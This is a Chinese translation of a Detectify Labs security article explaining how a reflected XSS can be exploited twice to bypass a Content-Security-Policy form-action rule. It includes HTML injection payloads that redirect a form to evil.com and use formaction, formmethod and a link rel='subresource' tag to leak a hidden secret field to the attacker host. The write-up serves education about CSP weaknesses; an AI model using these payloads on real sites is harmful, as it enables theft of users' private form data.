# 利用反射型XSS二次注入绕过CSP form-action限制

翻译:[SecurityToolkit](http://weibo.com/u/5824380435)

0x01 简单介绍
=========

* * *

CSP(Content-Security-Policy)是为了缓解XSS而存在的一种策略, 开发者可以设置一些规则来限制页面可以加载的内容.那文本中所说的form-action又是干啥的呢?用他可以限制form标签"action"属性的指向页面, 这样可以防止攻击者通过XSS修改表单的"action"属性,偷取用户的一些隐私信息.

0x02 实例分析
=========

* * *

上面讲的太抽象了, 如果不想看的话可以直接跳过....具体一点, 现在使用的是chrome浏览器, 假设下面这个secret.html是可能被XSS攻击的

```
//XSS在这里, victim.com/secret.html?xss=xss
<form method="POST" id='subscribe' action='oo.html'>
  <input name='secret' value='xiao_mi_mi'/>         //小秘密

```

如果这个站点没有CSP, 攻击者可以直接通过XSS修改

```
<form method="POST" action='http://evil.com/wo_de_mi_mi.php'>   //我的秘密

```

当用户傻傻地进行"正常'操作时,小秘密已经悄然变成攻击者的秘密了.然后,有一个管理员试图用CSP防止这个问题, 他使用白名单策略限制外部JS的加载并且不允许内联脚本, 好像安全性高了一点.

攻击者想了下, 把页面改成下面这个样子

```
<div><form action='http://evil.com/wo_de_mi_mi.php'></div>
<form method='POST' id='subscribe' action='oo.html'>

```

在原本的form之前又加了一个form标签, 这个新的form标签没有闭合,并且直接碰到了老form标签, 这个时候会发生什么呢?

![Screen Shot 2016-04-10 at 19.25.02](http://drops.javaweb.org/uploads/images/31acf41d80c908456739569042717add77e55c35.jpg)

老form标签就这样消失了! 所以攻击者再次把用户的小秘密发送到了自己的服务器上, 而且这时本来应该是POST的secret因为老form标签的消失现在变成了GET发送, 请求变成了下面这样.

![Screen Shot 2016-04-10 at 19.25.02](http://drops.javaweb.org/uploads/images/c65741b88c40e3f46fd51d10ea419c5ebb58b6dc.jpg)

这下管理员郁闷了, 最后索性用CSP加上了form-action来白名单限定form标签的action指向, 那么这样是否还会出现问题呢?

一起来回顾一下, 现在有一个不能执行JS的反射型XSS和一个只能往白名单域名(当然没有攻击者域名...)指向的form标签.

原secret.html

```
// XSS位置, victim.com/secret.html?xss=xss
<form method="POST" id='subscribe' action='oo.html'>
  <input name='secret' value='xiao_mi_mi'/>

```

最后攻击者的改过的页面如下

```
<input value='ByPass CSP' type='submit' form='subscribe' formaction='' formmethod='GET' />
<input type='hidden' name='xss' form='subscribe' value="<link rel='subresource' href='http://evil.com/wo_de_mi_mi.php'>">
// XSS, victim.com/secret.html?xss=xss
<form method="POST" id='subscribe' action='oo.html'>
  <input type='hidden' name='secret' value='xiao_mi_mi'/>
</form>

```

这里有几处tricky的地方, 整个代码的步骤如下

1.  input标签的form/formmethod/formaction将老form POST到oo.html的secret变成GET发送到secret.html即当前页面.
    
2.  跳转后仍处于secret.html因此该页面的XSS还可以被二次利用注入恶意标签, 这里又利用第二个input标签增加GET请求的xss参数, 所以跳转之后的URL变为
    
    ```
    http://victim.com/secret.html?secret=xiao_mi_mi&xss=<link rel='subresource' href='http://evil.com/wo_de_mi_mi.php'>
    
    ```
3.  此时secret.html再次触发XSS, 被攻击者加入下面标签
    
    ```
    <link rel='subresource' href='http://evil.com/wo_de_mi_mi.php'>
    
    ```
4.  ![Screen Shot 2016-04-10 at 20.12.36](http://drops.javaweb.org/uploads/images/4f94dd59cdb679fb79b82d8a35e8406db5e87924.jpg)
    

正是最后这个link标签泄露了本该POST发送的secret, 攻击者通过利用一个反射型XSS将CSP的form-action绕过.

0x03 最后
=======

* * *

CSP能够从某种程度上限制XSS, 对网站的防护是很有益义的. 不过相比国外经常能够看到相关的讨论,国内CSP的推进和热度却是比较不尽人意的, 同时关于CSP也有很多有意思的安全点, 特此翻译出来以供大家学习和参考.

原文链接:[https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/](https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/)